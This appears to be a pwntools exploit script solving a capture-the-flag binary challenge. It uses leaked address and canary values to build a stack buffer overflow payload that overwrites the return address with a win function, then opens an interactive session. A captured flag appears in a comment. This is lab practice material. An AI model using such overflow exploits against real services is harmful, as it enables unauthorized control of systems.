# %%

from pwn import *

# ref
# https://www.google.com/search?q=movaps+XMMWORD+PTR+%5Brsp%5D%2C+xmm1

# %%

conn = remote('10.113.184.121', 10041)
# conn = process(['./src/release/share/lab'])

# ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e5aae81641272592cf236ad4e7deadcac8950a64, for GNU/Linux 3.2.0, not stripped

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# gdbscript = 'gef\ngef\n'
# gdbscript += 'set follow-fork-mode child\n'

# _pid = gdb.attach(
#     conn,
#     gdbscript=gdbscript,
# )

# %%

conn.recvuntil(b'Gift: 0x')

winfunc_addr = int(conn.recvline().strip(), 16)
winfunc_addr = winfunc_addr + (0xf1 - 0xe9)
print(f"{winfunc_addr = }")

conn.recvuntil(b'Gift2: ')

canary = conn.recv().strip()[8:16]
print(f"{canary = }")

payload = b"A" * 8 + canary + b"A" * 8 + p64(winfunc_addr)
print(f"{payload = }")

# pause()

conn.sendline(payload)

conn.interactive()

# %%

# flag{Y0u_know_hoW2L3@k_canAry}
